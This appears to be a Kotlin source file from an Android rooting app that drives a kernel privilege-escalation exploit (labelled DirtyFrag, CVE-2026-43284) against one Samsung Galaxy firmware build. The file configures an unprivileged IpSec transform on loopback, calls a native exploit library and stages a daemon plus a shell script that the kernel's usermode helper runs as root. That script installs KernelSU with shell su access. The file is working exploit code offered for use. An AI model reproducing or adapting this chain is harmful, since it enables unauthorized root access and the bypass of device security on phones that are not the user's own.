package dev.busung.s25uroot

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import android.util.Log
import java.io.File
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom

/**
 * The HZIJ-only DirtyFrag (CVE-2026-43284) path.
 *
 * This is the stock DFRoot chain: the prebuilt `libdfroot.so` carries the
 * android13-5.15 module whose vermagic matches F946BXXU7HZIJ, and the app
 * drives the kernel through an unprivileged IpSec transform. No ADB, no
 * Shizuku, no system-uid helper.
 *
 * Two strings in the shipped library are patched for this app:
 *
 *  - the shellcode's daemon path is `/data/user_de/0/dev.busung.s25uroot/ksud`
 *  - the HZIJ module's usermode-helper command is
 *    `/bin/sh /data/user_de/0/dev.busung.s25uroot/s`
 *
 * Both files are staged by [stage] in the device-protected data directory, so
 * the same path exists before the user unlocks and the kernel helper can read
 * it as root. The helper copies the daemon to `/data/local/tmp/.ksud-stage`
 * and runs `late-load`; `ksud` renames that stage to `/data/adb/ksud` and starts
 * the KernelSU service. The chain's own return code 2 means the usermode helper
 * became the daemon and the caller stopped waiting, which is the successful
 * shape here.
 */
object DirtyFragRunner {
    private const val TAG = "DirtyFragRunner"

    const val ARMED_MARKER = "/dev/df"
    const val MANAGER_PACKAGE = "me.weishu.kernelsu"

    private const val ASSET_DAEMON = "ksud-hzij"
    private const val DAEMON_PATH = "/data/user_de/0/dev.busung.s25uroot/ksud"
    private const val MODULE_SCRIPT_PATH = "/data/user_de/0/dev.busung.s25uroot/s"

    private const val ICV_BITS = 128

    /** How long the live root probe may take after the chain returns. */
    private const val ROOT_WAIT_MS = 60_000L

    /** Delay between bounded su probes; each probe has its own 3 s cap. */
    private const val ROOT_PROBE_INTERVAL_MS = 2_000L

    /**
     * /dev/df marks a kernel that is already hooked. Re-running the full chain
     * against it is untested, and the boot ladder would otherwise do it four
     * times per boot. Allow one same-boot retry for a transient helper
     * failure, then require a reboot to clear the marker and the budget.
     */
    private const val MAX_ARMED_RETRIES = 1
    private const val RETRY_PREFS = "dirtyfrag_retry"
    private const val RETRY_BOOT_KEY = "boot_id"
    private const val RETRY_COUNT_KEY = "count"

    private val KO_TARGET_CANDIDATES = listOf(
        "/vendor/lib64/libbinderdebug.so",
        "/vendor/lib64/libstagefrighthw.so",
        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
    )

    /** True only for the SM-F946B build this module was compiled against. */
    fun isHzijDevice(): Boolean =
        Build.DISPLAY.contains("HZIJ", ignoreCase = true) ||
            Build.FINGERPRINT.contains("F946BXXU7HZIJ", ignoreCase = true)

    /** The boot marker the chain sets; it only clears on reboot. */
    fun alreadyArmed(): Boolean = runCatching { File(ARMED_MARKER).exists() }.getOrDefault(false)

    /**
     * One retry per boot for an armed-but-not-live kernel. The budget lives in
     * device-protected storage because this path runs before unlock and the
     * service process can be restarted between alarm retries.
     */
    private fun consumeArmedRetry(context: Context): Boolean {
        val bootId = runCatching {
            File("/proc/sys/kernel/random/boot_id").readText().trim()
        }.getOrNull() ?: return false
        val prefs = context.createDeviceProtectedStorageContext()
            .getSharedPreferences(RETRY_PREFS, Context.MODE_PRIVATE)
        val previousBoot = prefs.getString(RETRY_BOOT_KEY, null)
        val used = if (previousBoot == bootId) prefs.getInt(RETRY_COUNT_KEY, 0) else 0
        if (used >= MAX_ARMED_RETRIES) return false
        return prefs.edit()
            .putString(RETRY_BOOT_KEY, bootId)
            .putInt(RETRY_COUNT_KEY, used + 1)
            .commit()
    }

    sealed interface Outcome {
        data object NotApplicable : Outcome
        data object AlreadyActive : Outcome
        data class Rooted(val code: Int) : Outcome
        data class Failed(val message: String) : Outcome
    }

    /**
     * Stages the daemon and its setup script, runs the chain and reports whether
     * the kernel is armed. Call on a worker thread: [UniversalRoot.nativeRunAll]
     * blocks for the length of the chain (about seven seconds on HZIJ).
     */
    fun run(context: Context, report: (String) -> Unit): Outcome {
        if (!isHzijDevice()) return Outcome.NotApplicable

        // Mirror every pipeline line into logcat. The boot notification and the
        // in-app console are ephemeral; a clean-boot test needs the chain's own
        // return code and the helper's progress in a durable log.
        var failureLine: String? = null
        fun emit(line: String) {
            if (line.contains("***FAILED***")) failureLine = line
            Log.i(TAG, line)
            report(line)
        }

        // /dev/df is created before the helper runs and survives a failed
        // helper, so it is not proof of root. If root is live, report the
        // already-active state without arming the kernel a second time. If it
        // is not live, allow one same-boot retry (the BootReceiver ladder is
        // useful for a transient helper failure) but no more: /dev/df marks an
        // already-hooked kernel, and repeated nativeRunAll calls are untested.
        // A reboot clears the marker and the budget.
        if (alreadyArmed()) {
            if (RootStatusProbe.isActive()) return Outcome.AlreadyActive
            if (!consumeArmedRetry(context)) {
                return Outcome.Failed(
                    "$ARMED_MARKER exists but KernelSU is not live; armed retry budget exhausted - reboot required",
                )
            }
            emit("$ARMED_MARKER exists but root is not live; retrying within this boot")
        }

        val staged = try {
            stage(context)
        } catch (error: Throwable) {
            Log.e(TAG, "staging failed", error)
            return Outcome.Failed("staging failed: ${error.javaClass.simpleName}: ${error.message}")
        }
        emit("staged ${staged.first.absolutePath} (${staged.first.length()} bytes)")
        emit("staged ${staged.second.absolutePath}")

        val code = try {
            drive(context, ::emit)
        } catch (error: Throwable) {
            Log.e(TAG, "chain failed to start", error)
            return Outcome.Failed("chain failed to start: ${error.javaClass.simpleName}: ${error.message}")
        }

        emit("chain returned $code")
        val armed = alreadyArmed()
        emit(if (armed) "$ARMED_MARKER is present" else "$ARMED_MARKER is not visible yet")

        // Neither code 2 nor /dev/df is proof of root: the helper also exits
        // with code 2 when the script/ksud dies, and /dev/df is created before
        // the helper runs. The live probe is authoritative. `ksud late-load`
        // loads kernelsu.ko and then exits, so the native chain's
        // "***FAILED***: check logs" is also printed on a good load; it is
        // diagnostic only, not a success/failure decision.
        val live = waitForRoot()
        emit("root live: $live${failureLine?.let { " (chain: $it)" } ?: ""}")
        return if (live) {
            Outcome.Rooted(code)
        } else {
            Outcome.Failed(
                "chain code $code, armed=$armed, no live root after ${ROOT_WAIT_MS / 1000}s" +
                    (failureLine?.let { ": $it" } ?: ""),
            )
        }
    }

    /**
     * Poll for an actual sucompat answer, not merely a loaded module. A Live
     * kernelsu entry with a failed userspace install, or an app that is not in
     * the manager allowlist, would otherwise be recorded as root and suppress
     * every later retry for the rest of the boot. SuProbe is bounded (3 s), so
     * this loop respects the overall deadline even if a su request hangs.
     */
    private fun waitForRoot(): Boolean {
        val deadline = System.currentTimeMillis() + ROOT_WAIT_MS
        while (true) {
            if (SuProbe.isActive()) return true
            val remaining = deadline - System.currentTimeMillis()
            if (remaining <= 0) return false
            try {
                Thread.sleep(minOf(ROOT_PROBE_INTERVAL_MS, remaining))
            } catch (interrupted: InterruptedException) {
                Thread.currentThread().interrupt()
                return false
            }
        }
    }

    /**
     * Writes the 5.4 MB HZIJ daemon and the tiny setup script into the
     * device-protected data directory. Both names are compiled into the patched
     * module/library, so a different application id would need its own build.
     */
    private fun stage(context: Context): Pair<File, File> {
        val deviceProtected = context.createDeviceProtectedStorageContext()
        val dataDir = deviceProtected.filesDir.parentFile
            ?: error("no device-protected data directory")
        val daemon = File(dataDir, "ksud")
        val script = File(dataDir, "s")

        check(daemon.absolutePath == DAEMON_PATH) {
            "daemon path ${daemon.absolutePath} does not match the patched library $DAEMON_PATH"
        }
        check(script.absolutePath == MODULE_SCRIPT_PATH) {
            "script path ${script.absolutePath} does not match the patched module $MODULE_SCRIPT_PATH"
        }

        context.assets.open(ASSET_DAEMON).use { input ->
            daemon.outputStream().use { output -> input.copyTo(output) }
        }
        daemon.setReadable(true, false)
        daemon.setExecutable(true, false)

        script.writeText(setupScript(daemon.absolutePath))
        script.setReadable(true, false)
        script.setExecutable(true, false)
        return daemon to script
    }

    private fun setupScript(daemon: String): String = buildString {
        appendLine("#!/system/bin/sh")
        appendLine("export PATH=/bin:/system/bin")
        // Capture the helper's own diagnostics. A bare `exec >` is unsafe here:
        // mksh exits when that redirection fails, so a missing or relabelled
        // /data/local/tmp would look exactly like the silent failure this log
        // exists to diagnose. Test the open first and fall back to /dev/null so
        // the access check and the copy still run and remain traceable.
        appendLine("LOG=/data/local/tmp/dfroot-ksud.log")
        appendLine("mkdir -p /data/local/tmp 2>/dev/null")
        appendLine(": >> \"\$LOG\" 2>/dev/null || LOG=/dev/null")
        appendLine("exec >> \"\$LOG\" 2>&1")
        appendLine("set -x")
        appendLine("echo dfroot-script-start")
        appendLine("D=$daemon")
        appendLine("S=/data/local/tmp/.ksud-stage")
        // Only read access is needed from the app-protected copy: it is copied
        // to /data/local/tmp and executed from there. Requiring -x made the
        // helper depend on SELinux exec permission for app_data_file, which the
        // kernel usermodehelper domain does not have, so the check failed before
        // the log was opened.
        appendLine("[ -r \"\$D\" ] || exit 1")
        appendLine("rm -f \"\$S\"")
        appendLine("/system/bin/cp -f \"\$D\" \"\$S\" || exit 1")
        appendLine("/system/bin/chmod 0755 \"\$S\" || exit 1")
        appendLine("/system/bin/cmp -s \"\$D\" \"\$S\" || exit 1")
        // Late-load renames the stage to /data/adb/ksud, installs the userspace
        // component (`utils::install(None)`) and loads kernelsu.ko. It must be
        // the helper's main process: the chain then reports code 2 ("stopped
        // waiting for the daemon"), which is the success shape and keeps
        // /dev/df alive. A backgrounded late-load dies when the helper shell
        // exits; a foreground shell that waits on it makes the chain time out
        // and clean up before /dev/df is visible.
        //
        // `--allow-shell` loads the module with allow_shell=1. The kernel's
        // su_compat then intercepts /system/bin/su for the adb shell UID, so
        // `su -c id` works without a su file on the read-only /system. This is
        // the only su path the app can create without touching a partition.
        appendLine("exec \"\$S\" late-load --allow-shell --package-name $MANAGER_PACKAGE")
    }

    /**
     * The IpSec half: an unprivileged UDP encapsulation socket, an SPI on the
     * loopback, one AES-CBC key and one HMAC key. The kernel decrypts the ESP
     * packets into the page cache of the files the native side splices.
     */
    private fun drive(context: Context, report: (String) -> Unit): Int {
        val ipsec = context.getSystemService(Context.IPSEC_SERVICE) as IpSecManager
        val encapsulation = ipsec.openUdpEncapsulationSocket()
        val loopback = InetAddress.getByName("127.0.0.1")
        val spi = ipsec.allocateSecurityParameterIndex(loopback)
        val random = SecureRandom()
        val aesKey = ByteArray(32).also(random::nextBytes)
        val macKey = ByteArray(32).also(random::nextBytes)

        val senderPort = DatagramSocket().let { socket ->
            val port = socket.localPort
            socket.close()
            port
        }

        val transform = IpSecTransform.Builder(context)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setAuthentication(IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, macKey, ICV_BITS))
            .setIpv4Encapsulation(encapsulation, senderPort)
            .buildTransportModeTransform(loopback, spi)

        val koTarget = KO_TARGET_CANDIDATES.firstOrNull { File(it).exists() }
            ?: KO_TARGET_CANDIDATES.first()

        return try {
            report("chain: starting (encap port ${encapsulation.port}, spi ${spi.spi})")
            report("ko target: $koTarget")
            UniversalRoot.nativeRunAll(
                reporter = UniversalRoot.Reporter { line -> report(line.trim()) },
                koTarget = koTarget,
                encapPort = encapsulation.port,
                spi = spi.spi,
                aesCbcKey = aesKey,
                hmacKey = macKey,
                icvLen = ICV_BITS / 8,
                senderPort = senderPort,
                packageName = MANAGER_PACKAGE,
            )
        } finally {
            runCatching { transform.close() }
            runCatching { spi.close() }
            runCatching { encapsulation.close() }
        }
    }
}
